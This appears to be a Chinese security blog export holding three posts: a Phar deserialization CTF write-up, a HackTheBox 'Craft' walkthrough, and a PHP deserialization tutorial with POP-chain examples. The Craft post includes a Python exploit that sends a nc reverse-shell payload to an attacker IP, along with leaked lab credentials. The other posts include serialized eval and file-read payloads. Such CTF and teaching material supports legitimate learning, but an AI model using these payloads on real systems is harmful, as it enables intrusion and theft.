Phar反序列化实例 [HITCON 2017]Baby^h Master PHP 我们先看看Orange 在 2017 年 hitcon 上面出的利用 Phar 进行反序列化，毕竟这是第一次出现这种利用方式的地方，应该来说是最经典的利用场景。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?php // 得到 flag 的匿名函数 $FLAG = create_function(&quot;&quot;, &#x27;die(`/read_flag`);&#x27;); $SECRET = `/read_secret`; // 根据 remote_addr 给每个人创建一个沙盒 $SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); @mkdir($SANDBOX); @chdir($SANDBOX); if (!isset($_COOKIE[&quot;session-data&quot;])) &#123; $data = serialize(new User($SANDBOX)); $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET); //将每个人唯一的沙盒对象加上签名后作为 session-data setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac)); &#125; class User &#123; public $avatar; function __construct($path) &#123; //设置了头像的路径为沙盒路径 $this-&gt;avatar = $path; &#125; &#125; class Admin extends User &#123; function __destruct()&#123; $random = bin2hex(openssl_random_pseudo_bytes(32)); eval(&quot;function my_function_$random() &#123;&quot; .&quot; global \\$FLAG; \\$FLAG();&quot; /*反序列化这个对象就能创建一个随机名字的函数，调用这个函数就能调用 flag，实际上这是一个骗局，匿名函数也是有名字的*/ .&quot;&#125;&quot;); $_GET[&quot;lucky&quot;](); &#125; &#125;//判断身份，如果身份正确返回头像路径(沙盒路径)//该函数不可绕过 function check_session() &#123; global $SECRET; $data = $_COOKIE[&quot;session-data&quot;]; list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) die(&quot;Bye&quot;); if ( !hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac) ) die(&quot;Bye Bye&quot;); $data = unserialize($data); if ( !isset($data-&gt;avatar) ) die(&quot;Bye Bye Bye&quot;); return $data-&gt;avatar; &#125;//获取头像，检查头是否为GIF89a ，正确后存入沙盒 function upload($path) &#123; $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); //这个就是利用 phar:// 进行反序列化的点 if (substr($data, 0, 6) !== &quot;GIF89a&quot;) die(&quot;Fuck off&quot;); file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;); &#125;//获取这个沙盒中的头像 function show($path) &#123; if ( !file_exists($path . &quot;/avatar.gif&quot;) ) $path = &quot;/var/www/html&quot;; header(&quot;Content-Type: image/gif&quot;); die(file_get_contents($path . &quot;/avatar.gif&quot;)); &#125;$mode = $_GET[&quot;m&quot;];if ($mode == &quot;upload&quot;) upload(check_session());else if ($mode == &quot;show&quot;) show(check_session());else highlight_file(__FILE__); 这道题很明确就是一个反序列化的题，我们的目的就是通过反序列化 Admin 这个类得到我们的 flag。但是如果我们想利用 unserailize() ，通过控制其参数去实现我们的反序列化，我们就必须绕过对 cookie 的检测，但是cookie 是通过 remote_addr 配合 sha1 进行 hmac 签名生成的，想绕过他那是不可能的。现在我们就要思考一下 是不是能用 Phar 这个在不使用 unserialize() 的方式完成序列化成功 get flag，然后我们就看到了这个函数： 1234567function upload($path) &#123; $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); if (substr($data, 0, 6) !== &quot;GIF89a&quot;) die(&quot;Fuck off&quot;); file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;);&#125; 我们只要的精心构造一个包含 Admin 对象、包含 avatar.gif 文件，并且 stub 是 GIF89a 的 phar 文件然后上传上去，下一次请求通过 Phar:// 协议让 file_get_contents 请求这个文件就可以实现我们对 Admin 对象的反序列化了。 12345678910&lt;?phpclass Admin &#123; public $avatar = &#x27;orz&#x27;; &#125; $p = new Phar(__DIR__ . &#x27;/avatar.phar&#x27;, 0);$p[&#x27;file.php&#x27;] = &#x27;&lt;?php ?&gt;&#x27;;$p-&gt;setMetadata(new Admin());$p-&gt;setStub(&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);rename(__DIR__ . &#x27;/avatar.phar&#x27;, __DIR__ . &#x27;/avatar.gif&#x27;);?&gt; 之后会利用匿名函数生成函数名的特点，这里就不多叙述。 这道题我在BUU上面一直没有复现成功，卡在上传phar文件，一直回显fuck off，不知道为什么，有知道的师傅可以赐教一下。 [LCTF2018] T4lk 1sch34p,sh0w m3 the sh31l 这道题没有复现环境，是K0rz3n师傅根据上面这道题魔改的。 出题人的思路： https://www.k0rz3n.com/2018/11/19/LCTF 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析/","tags":[{"name":"web安全基础","slug":"web安全基础","permalink":"http://ca0y1h.top/tags/web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"},{"name":"PHP反序列化","slug":"PHP反序列化","permalink":"http://ca0y1h.top/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}],"categories":[{"name":"web安全","slug":"web安全","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/"},{"name":"基础学习","slug":"web安全/基础学习","permalink":"http://ca0y1h.top/categories/web%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"HTB::Craft-walkthrough","date":"2020-05-08T14:29:29.000Z","path":"Target_drone/HackTheBox/16.HTB-Craft-walkthrough/","text":"HTB::Craft Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap REST API Git commit history Vault OTP 0x03 Pentesting Inital Enumeration 端口扫描 1234567891011121314151617181920212223242526272829303132333435$ nmap -A -Pn -T4 -p- 10.10.10.110Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-01 21:42 EDTNmap scan report for 10.10.10.110Host is up (0.29s latency).Not shown: 65462 closed ports, 70 filtered portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)| ssh-hostkey:| 2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)| 256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)|_ 256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)443&#x2F;tcp open ssl&#x2F;http nginx 1.15.8|_http-server-header: nginx&#x2F;1.15.8|_http-title: About| ssl-cert: Subject: commonName&#x3D;craft.htb&#x2F;organizationName&#x3D;Craft&#x2F;stateOrProvinceName&#x3D;NY&#x2F;countryName&#x3D;US| Not valid before: 2019-02-06T02:25:47|_Not valid after: 2020-06-20T02:25:47|_ssl-date: TLS randomness does not represent time| tls-alpn:|_ http&#x2F;1.1| tls-nextprotoneg:|_ http&#x2F;1.16022&#x2F;tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-Go| ssh-hostkey: |_ 2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :SF-Port6022-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;5&#x2F;1%Time&#x3D;5EACD7D6%P&#x3D;x86_64-pc-linux-gnu%r(NULSF:L,C,&quot;SSH-2\\.0-Go\\r\\n&quot;);Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 2030.05 seconds 主要考察443端口站点 导航栏有两个网页链接： 1234&lt;ul class=&quot;nav navbar-nav pull-right&quot;&gt; &lt;li&gt;&lt;a href=&quot;https://api.craft.htb/api/&quot;&gt;API&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;https://gogs.craft.htb/&quot;&gt;&lt;img border=&quot;0&quot; alt=&quot;Git&quot; src=&quot;/static/img/Git-Icon-Black.png&quot; width=&quot;20&quot; height=&quot;20&quot;&gt;&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; 把api.craft.htb和gogs.craft.htb加到/etc/hosts文件中，再访问： 发现是一个REST API接口Swagger文档，单独的一个API文档没有什么利用价值，再去看看gogs.craft.htb： 发现是一个类似GitHub的代码托管平台，里面有443端口站点的源代码，来看看commit提交历史： 主要看编号为 c414b16057 and 10e3ba4f0a这两个commits，其中c414b16057 代码执行漏洞： 12345678910111213141516@@ -38,9 +38,13 @@ class BrewCollection(Resource): &quot;&quot;&quot; Creates a new brew entry. &quot;&quot;&quot;-- create_brew(request.json)- return None, 201++ # make sure the ABV value is sane.+ if eval(&#x27;%s &gt; 1&#x27; % request.json[&#x27;abv&#x27;]):+ return &quot;ABV must be a decimal value less than 1.0&quot;, 400+ else:+ create_brew(request.json)+ return None, 201 @ns.route(&#x27;/&lt;int:id&gt;&#x27;) @api.response(404, &#x27;Brew not found.&#x27;) 10e3ba4f0a有一处代码泄露： 123+response = requests.get(&#x27;https://api.craft.htb/api/auth/login&#x27;, auth=(&#x27;dinesh&#x27;, &#x27;4aUh0A8PbVJxgd&#x27;), verify=False)+json_response = json.loads(response.text)+token = json_response[&#x27;token&#x27;] 利用思路：用凭证dinesh: 4aUh0A8PbVJxgd登录api.craft.htb/api/auth/login，然后再利用代码执行漏洞写入反弹shell，show code： 12345678910111213141516171819202122232425import requestsimport jsonresponse = requests.get(&#x27;https://api.craft.htb/api/auth/login&#x27;, auth=(&#x27;dinesh&#x27;, &#x27;4aUh0A8PbVJxgd&#x27;), verify=False)json_response = json.loads(response.text)token = json_response[&#x27;token&#x27;]headers = &#123; &#x27;X-Craft-API-Token&#x27;: token, &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;# make sure token is validresponse = requests.get(&#x27;https://api.craft.htb/api/auth/check&#x27;, headers=headers, verify=False)print(response.text)print(&quot;Create bogus ABV brew&quot;)payload = &quot;__import__(&#x27;os&#x27;).system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.43 1234 &gt;/tmp/f&#x27;)&quot;brew_dict = &#123;&#125;brew_dict[&#x27;abv&#x27;] = payload + &#x27;| 0.15&#x27;brew_dict[&#x27;name&#x27;] = &#x27;exp&#x27;brew_dict[&#x27;brewer&#x27;] = &#x27;exp&#x27;brew_dict[&#x27;style&#x27;] = &#x27;exp&#x27;json_data = json.dumps(brew_dict)response = requests.post(&#x27;https://api.craft.htb/api/brew/&#x27;, headers=headers, data=json_data, verify=False)print(response.text) 主机监听1234端口，成功反弹shell。 Getting User Access 123456789101112131415161718192021222324&#x2F;opt&#x2F;app # cd &#x2F;&#x2F; # ls -latotal 64drwxr-xr-x 1 root root 4096 Feb 10 2019 .drwxr-xr-x 1 root root 4096 Feb 10 2019 ..-rwxr-xr-x 1 root root 0 Feb 10 2019 .dockerenvdrwxr-xr-x 1 root root 4096 Jan 3 17:20 bindrwxr-xr-x 5 root root 340 Jan 3 14:58 devdrwxr-xr-x 1 root root 4096 Feb 10 2019 etcdrwxr-xr-x 2 root root 4096 Jan 30 2019 homedrwxr-xr-x 1 root root 4096 Feb 6 2019 libdrwxr-xr-x 5 root root 4096 Jan 30 2019 mediadrwxr-xr-x 2 root root 4096 Jan 30 2019 mntdrwxr-xr-x 1 root root 4096 Feb 9 2019 optdr-xr-xr-x 238 root root 0 Jan 3 14:58 procdrwx------ 1 root root 4096 Jan 3 15:16 rootdrwxr-xr-x 2 root root 4096 Jan 30 2019 rundrwxr-xr-x 2 root root 4096 Jan 30 2019 sbindrwxr-xr-x 2 root root 4096 Jan 30 2019 srvdr-xr-xr-x 13 root root 0 Jan 3 14:58 sysdrwxrwxrwt 1 root root 4096 Jan 3 17:26 tmpdrwxr-xr-x 1 root root 4096 Feb 9 2019 usrdrwxr-xr-x 1 root root 4096 Jan 30 2019 var&#x2F; # 结果发现并没有拿到靶机的shell，而是一个docker镜像的shell。 发现在项目的主目录/opt/app有一个dbtest.py文件： 12345678910111213141516171819202122#!&#x2F;usr&#x2F;bin&#x2F;env pythonimport pymysqlfrom craft_api import settings# test connection to mysql databaseconnection &#x3D; pymysql.connect(host&#x3D;settings.MYSQL_DATABASE_HOST, user&#x3D;settings.MYSQL_DATABASE_USER, password&#x3D;settings.MYSQL_DATABASE_PASSWORD, db&#x3D;settings.MYSQL_DATABASE_DB, cursorclass&#x3D;pymysql.cursors.DictCursor)try: with connection.cursor() as cursor: sql &#x3D; &quot;SELECT &#96;id&#96;, &#96;brewer&#96;, &#96;name&#96;, &#96;abv&#96; FROM &#96;brew&#96; LIMIT 1&quot; cursor.execute(sql) result &#x3D; cursor.fetchone() print(result)finally: connection.close() 此时mysql命令同样不能使用。 但是，我们从gogs仓库的代码中，得知数据库中应该有两张表：brew和user，那么就可以模仿dbtest.py重新写一个查询语句dump所有的用户： 12345678910111213141516171819202122#!/usr/bin/env pythonimport pymysqlfrom craft_api import settings# test connection to mysql databaseconnection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB, cursorclass=pymysql.cursors.DictCursor)try: with connection.cursor() as cursor: sql = &quot;SELECT `username`, `password` FROM `user`&quot; cursor.execute(sql) result = cursor.fetchall() print(result)finally: connection.close() 所有用户： 123&#123;&#x27;username&#x27;: &#x27;dinesh&#x27;, &#x27;password&#x27;: &#x27;4aUh0A8PbVJxgd&#x27;&#125;, &#123;&#x27;username&#x27;: &#x27;ebachman&#x27;, &#x27;password&#x27;: &#x27;llJ77D8QFkLPQB&#x27;&#125;, &#123;&#x27;username&#x27;: &#x27;gilfoyle&#x27;, &#x27;password&#x27;: &#x27;ZEU3N8WNM2rh4T&#x27;&#125; 经过尝试，这几个密码并不是SSH的登录密码，实在没思路了去看了一眼Writeup，gilfoyle有一个私有仓库craft-infra，并且仓库代码中泄露了SSH的private key： 并且这个private key有密码保护，但是这个密码和gilfoyle的gogs密码相同： Getting Root Access 用户的主目录下有一个.vault_key文件，Google一下 Secure, store and tightly control access to tokens, passwords, certificates, encryption keys for protecting secrets and other sensitive data using a UI, CLI, or HTTP API. 根据https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords这篇文档，再结合craft-infra仓库中有一个文件夹vault中的secrets.sh文件，可以使用vault命令登录SSH： 12345gilfoyle@craft:~$ vault ssh -role root_otp -mode otp root@127.0.0.1Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayedbelow. Enter this code in the SSH password prompt. If you install sshpass,Vault can automatically perform this step for you.OTP for the session is: a66d769f-f1e3-e3bd-9b52-2cfb7edcd85b 这样说起来提权过程好像比较简短，但是做起来要花不少的功夫。","tags":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"HTB","permalink":"http://ca0y1h.top/tags/HTB/"}],"categories":[{"name":"靶机","slug":"靶机","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"}]},{"title":"PHP反序列化漏洞学习-基础篇","date":"2020-05-07T06:54:17.000Z","path":"Web_security/php_related/2.PHP反序列化学习-基础篇/","text":"PHP反序列化漏洞学习——基础篇 0x01 什么是序列化和反序列化 php的序列化 PHP 的所谓的序列化也是一个将各种类型的数据，压缩并按照一定格式存储的过程，他所使用的函数是serialize() ，我们来看下面的实例： 12345678910111213141516171819202122&lt;?phpclass Person&#123; private $name = &#x27;test&#x27;; protected $gender = &#x27;male&#x27;; public $age = 18; public function set_name($name) &#123; $this-&gt;name = $name; &#125; public function get_name() &#123; return $this-&gt;name; &#125;&#125;$user = new Person();$user-&gt;set_name(&#x27;ca01h&#x27;);$data = serialize($user);echo $data; 这是一个简单的 php 类，然后我们实例化以后对其属性进行了赋值，然后调用了 serialize() 并且输出，我们看一下输出的结果： 依次解释如下： O代表Object对象； 6代表类名长度是6； Person代表类名； 3代表类中的属性有3个； s:12:&quot;&lt;0x00&gt;Person&lt;0x00&gt;name&quot;;s:5:&quot;ca01h&quot;;：其中s代表String类型，12代表属性名&lt;0x00&gt;Person&lt;0x00&gt;name的长度，s代表String类型，5代表属性值的长度，&quot;ca01h&quot;是属性值； s:9:&quot;&lt;0x00&gt;*&lt;0x00&gt;gender&quot;;s:4:&quot;male&quot;;：其中s代表String类型，9代表属性名&lt;0x00&gt;*&lt;0x00&gt;gender的长度，s代表String类型，4代表属性值的长度，&quot;male&quot;是属性值； s:3:&quot;age&quot;;i:17;：其中s代表String类型，3代表属性名&quot;age&quot;的长度，i代表Integer类型，17是属性值。 这里有两个值得注意的地方： 不同类型类属性 private属性序列化的格式：%00类名%00属性名 protect属性序列化的格式：%00*%00属性名 序列化只序列化类属性，不序列化类方法 所以在利用反序列化漏洞的时候： 我们在反序列化的时候一定要保证在当前的作用域环境下有该类存在 我们在反序列化攻击的时候也就是依托类属性进行攻击 PHP的反序列化 有序列化对象为压缩格式化的字符串，就有反序列化将压缩格式化的字符串还原，我们还是沿用上面的代码，先将序列化的内容存放在serialize.txt 里面，然后再进行反序列化，并输出属性值name和age的值： 12345678910111213141516171819202122232425&lt;?phpclass Person&#123; private $name = &#x27;test&#x27;; protected $gender = &#x27;male&#x27;; public $age = 18; public function set_name($name) &#123; $this-&gt;name = $name; &#125; public function get_name() &#123; return $this-&gt;name; &#125;&#125;$user = new Person();$user-&gt;set_name(&#x27;ca01h&#x27;);$data = serialize($user);// echo $data;$data = unserialize($data);echo $data-&gt;age;echo $data-&gt;get_name(); 反序列化结果： 1218ca01h 那么稍微延申一点，如果$data参数是用户可控的呢，比如我传入一个如下参数： 1O:6:&quot;Person&quot;:3:&#123;s:12:&quot;&lt;0x00&gt;Person&lt;0x00&gt;name&quot;;s:5:&quot;hacker&quot;;s:9:&quot;&lt;0x00&gt;*&lt;0x00&gt;gender&quot;;s:4:&quot;female&quot;;s:3:&quot;age&quot;;i:17;&#125; 这样就人为的改变了类属性的值，由此引出PHP反序列化漏洞。 0x02 PHP反序列化漏洞 反序列化漏洞的成因在于代码中的 unserialize() 接收的参数可控，从上面的例子看，这个函数的参数是一个序列化的对象，而序列化的对象只含有对象的属性，那我们就要利用对对象属性的篡改实现最终的攻击。 魔法方法调用 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpClass User&#123; public $name = &quot;Bob&quot;; private $id = &quot;417&quot;; function __construct($name)&#123; $this-&gt;name = $name; echo &quot;this is __construct&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __destruct()&#123; echo &quot;this is __destruct&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __invoke()&#123; echo &quot;this is __invoke&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __toString()&#123; return &quot;this is __toString&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __wakeup()&#123; echo &quot;this is __wakeup&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __sleep()&#123; echo &quot;this is __sleep&quot;.&quot;&lt;/br&gt;&quot;; return array(&quot;name&quot;,&quot;id&quot;); &#125; function __call($name,$args)&#123; echo &quot;this is __call. name is &quot;.$name.&quot; args is &quot;.$args.&quot;&lt;/br&gt;&quot;; &#125; function __get($arg)&#123; echo&quot;call __get&quot;.&quot;&lt;/br&gt;&quot;; &#125; function __set($name,$id)&#123; echo &quot;call __set&quot;.&quot;&lt;/br&gt;&quot;; &#125;&#125;$r = new User(&quot;Alice&quot;);$r();echo $r;unserialize(serialize($r));$r-&gt;print(&quot;a&quot;);$r-&gt;id;$r-&gt;id = 1; 输出顺序如下： 12345678910this is __constructthis is __invokethis is __toStringthis is __sleepthis is __wakeupthis is __destructthis is __call. name is print args is Arraycall __getcall __setthis is __destruct 其中__toString()触发方式比较多： echo ($obj) / print($obj) 打印时会触发 反序列化对象与字符串连接时 反序列化对象参与格式化字符串时 反序列化对象与字符串进行比较时（PHP进行比较的时候会转换参数类型） 反序列化对象参与格式化SQL语句，绑定参数时 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 反序列化的对象作为 class_exists() 的参数的时候 魔法方法的作用 我们上面讲过，在我们的攻击中，反序列化函数 unserialize() 是我们攻击的入口，也就是说，只要这个参数可控，我们就能传入任何的已经序列化的对象（只要这个类在当前作用域存在我们就可以利用），而不是局限于出现 unserialize() 函数的类的对象，如果只能局限于当前类，那我们的攻击面也太狭小了，这个类不调用危险的方法我们就没法发起攻击。 但是我们又知道，你反序列化了其他的类对象以后我们只是控制了是属性，如果你没有在完成反序列化后的代码中调用其他类对象的方法，我们还是束手无策，毕竟代码是人家写的，人家本身就是要反序列化后调用该类的某个安全的方法，你总不能改人家的代码吧，但是没关系，因为我们有魔法方法。 魔法正如上面介绍的，魔法方法的调用是在该类序列化或者反序列化的同时自动完成的，不需要人工干预，这就非常符合我们的想法，因此只要魔法方法中出现了一些我们能利用的函数，我们就能通过反序列化中对其对象属性的操控来实现对这些函数的操控，进而达到我们发动攻击的目的。 魔法方法的简单利用 123456789101112131415161718192021222324252627&lt;?phpclass demo &#123; private $test; public $name = &quot;i am ca01h&quot;; function __construct() &#123; $this-&gt;test = new L(); &#125; function __destruct() &#123; $this-&gt;test-&gt;action(); &#125;&#125;class L &#123; function action() &#123; echo &quot;function action() in class L&quot;; &#125;&#125;class Evil &#123; var $test2; function action() &#123; eval($this-&gt;test2); &#125;&#125;unserialize($_GET[&#x27;test&#x27;]); 首先我们能看到unserialize()函数的参数我们是可以控制的，也就是说我们能通过这个接口反序列化任何类的对象(但只有在当前作用域的类才对我们有用)，那我们看一下当前这三个类，我们看到后面两个类反序列化以后对我们没有任何意义，因为我们根本没法调用其中的方法，但是第一个类就不一样了，虽然我们也没有什么代码能实现调用其中的方法的，但是我们发现他有一个魔法函数 __destruct() ，这就非常有趣了，因为这个函数能在对象销毁的时候自动调用，不用我们人工的干预，接下来让我们看一下怎么利用。 我们看到__destruct()里面只用到了一个属性test，再观察一下 那些地方调用了action()函数，看看这个函数的调用中有没有存在执行命令或者是其他我们能利用的点的，果然在 Evil 这个类中发现他的 action() 函数调用了 eval(),那我们的想法就很明确了，只需要将demo这个类中的test属性篡改为 Evil 这个类的对象，然后为了 eval 能执行命令，我们还要篡改Evil对象的 test2 属性，将其改成要执行的命令。 123456789101112131415161718&lt;?phpclass demo&#123; private $test; function __construct() &#123; $this-&gt;test = new Evil(); &#125;&#125;class Evil&#123; var $test2 = &quot;phpinfo()&quot;;&#125;$demo = new demo();$data = serialize($demo);var_dump($data); 输出的payload： 1O:4:&quot;demo&quot;:1:&#123;s:10:&quot;\\000demo\\000test&quot;;O:4:&quot;Evil&quot;:1:&#123;s:5:&quot;test2&quot;;s:9:&quot;phpinfo()&quot;;&#125;&#125; 这样就完成了一个简单的PHP反序列化漏洞的利用。 通过这个简单的例子总结一下寻找 PHP 反序列化漏洞的方法或者流程 (1)寻找unserialize()函数的参数是否有我们的可控点； (2)寻找我们的反序列化的目标，重点寻找存在 wakeup() 或 destruct() 魔法函数的类； (3)一层一层地研究该类在魔法方法中使用的属性和属性调用的方法，看看是否有可控的属性能实现在当前调用的过程中触发的； (4)找到我们要控制的属性了以后我们就将要用到的代码部分复制下来，然后构造序列化，发起攻击。 0x03 PHP反序列化POP链 POP链介绍 POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链,最终达到攻击者邪恶的目的 说的再具体一点就是 ROP 是通过栈溢出实现控制指令的执行流程，而我们的反序列化是通过控制对象的属性从而实现控制程序的执行流程，进而达成利用本身无害的代码进行有害操作的目的。 POP链demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?php//flag is in flag.phperror_reporting(1);class Read &#123; public $var; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125; public function __invoke()&#123; $content = $this-&gt;file_get($this-&gt;var); echo $content; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;) &#123; $this-&gt;source = $file; echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;; &#125; public function __toString() &#123; return $this-&gt;str[&#x27;str&#x27;]-&gt;source; &#125; public function _show() &#123; if(preg_match(&#x27;/gopher|http|ftp|https|dict|\\.\\.|flag|file/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct() &#123; $this-&gt;p = array(); &#125; public function __get($key) &#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;hello&#x27;]))&#123; unserialize($_GET[&#x27;hello&#x27;]);&#125;else&#123; $show = new Show(&#x27;pop3.php&#x27;); $show-&gt;_show();&#125; 寻找POP链过程： 66行代码处有unserialize()函数，而且参数可控； 在Show这个类中有__wakeup()方法； __wakeup()方法中调用了preg_replace()函数，如果source属性是某一个类对象的话，会触发__toString()方法； 在Show这个类中有__toString()方法； __toSting()方法中试图获取属性str中key为str的值的source属性，如果str['str']是某一个类对象的话，会触发__get()方法； 在Test这个类中有__get()方法； __get()方法中，如果p属性是某一个类对象的话，会出发__invoke()方法； 在Read这个类中有__invoke()方法； __invoke()方法中尝试读取并打印属性var的文件内容，为了读取flag.php的内容，可以让var = flag.php。 生成反序列化Payload的exp： 123456789101112131415161718192021&lt;?phpclass Read &#123; public $var = flag.php;&#125;class Show &#123; public $source; public $str;&#125;class Test &#123; public $p;&#125;$r = new Read();$s = new Show();$t = new Test();$t-&gt;p = $r;$s-&gt;str[&#x27;str&#x27;] = $t;$s-&gt;source = $s;var_dump(serialize($s)); 最后得出来的payload： 1O:4:&quot;Show&quot;:2:&#123;s:6:&quot;source&quot;;r:1;s:3:&quot;str&quot;;a:1:&#123;s:3:&quot;str&quot;;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;p&quot;;O:4:&quot;Read&quot;:1:&#123;s:3:&quot;var&quot;;s:7:&quot;flagphp&quot;;&#125;&#125;&#125;&#125; 有关PHP反序列化的基础篇就写到这，当然肯定不止于此，接下来是进阶篇，涉及到SoapClient反序列化，PHP反序列化字符逃逸，Phar反序列化，Session反序列化，以及最后一个VulnHub靶机收尾。 0x04 一道实例 该题出处：https://www.cnblogs.com/nul1/p/9928797.html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?phperror_reporting(0);class come&#123; private $method; private $args; function __construct($method, $args) &#123; $this-&gt;method = $method; $this-&gt;args = $args; &#125; function __wakeup()&#123; foreach($this-&gt;args as $k =&gt; $v) &#123; $this-&gt;args[$k] = $this-&gt;waf(trim($v)); &#125; &#125; function waf($str)&#123; $str=preg_replace(&quot;/[&lt;&gt;*;|?\\n ]/&quot;,&quot;&quot;,$str); $str=str_replace(&#x27;flag&#x27;,&#x27;&#x27;,$str); return $str; &#125; function echos($host)&#123; system(&quot;echos $host&quot;.$host); &#125; function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echos&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125; &#125;&#125;$first=&#x27;hi&#x27;;$var=&#x27;var&#x27;;$bbb=&#x27;bbb&#x27;;$ccc=&#x27;ccc&#x27;;$i=1;foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125;if($first===&quot;doller&quot;)&#123; @parse_str($_GET[&#x27;a&#x27;]); if($var===&quot;give&quot;) &#123; if($bbb===&quot;me&quot;) &#123; if($ccc===&quot;flag&quot;) &#123; echo &quot;&lt;br&gt;welcome!&lt;br&gt;&quot;; $come=@$_POST[&#x27;come&#x27;]; unserialize($come); &#125; &#125; else &#123;echo &quot;&lt;br&gt;think about it&lt;br&gt;&quot;;&#125; &#125; else &#123; echo &quot;NO&quot;; &#125;&#125;else&#123; echo &quot;Can you hack me?&lt;br&gt;&quot;;&#125;?&gt; 变量覆盖漏洞 $$ 12345678foreach($_GET as $key =&gt; $value) &#123; if($i===1) &#123; $i++; $$key = $value; &#125; else&#123;break;&#125;&#125; ?first=doller绕过第一个if语句 parse_str 如果直接这样写?first=doller&amp;a=var=give&amp;bbb=me&amp;ccc=flag的话，PHP解析的是四个参数，而不是我想得到的两个参数：一个first和一个a。不过好在有URL编码这种东西，可以在这有歧义的时候扭转局势，我们把&amp;进行URL编码，这样子解析时就会认为是一个字符串了，即： ?first=doller&amp;a=var=give%26bbb=me%26ccc=flag 反序列化漏洞 查看代码，发现到了反序列化的地方了，而反序列化的来源是通过POST提交的come参数，知道了要反序列化，接下来就是确定要反序列化的类了。这个源码就一个类come，对这个类进行审计，重点看__destruct方法： 12345function __destruct()&#123; if (in_array($this-&gt;method, array(&quot;echos&quot;))) &#123; call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); &#125;&#125; call_user_func_array()内置方法的作用是调用一个指定方法，第一个参数要调用的函数，第二个参数是一个数组，用于给调用的函数传参。但是这里的第一个参数是用一个数组array($this, 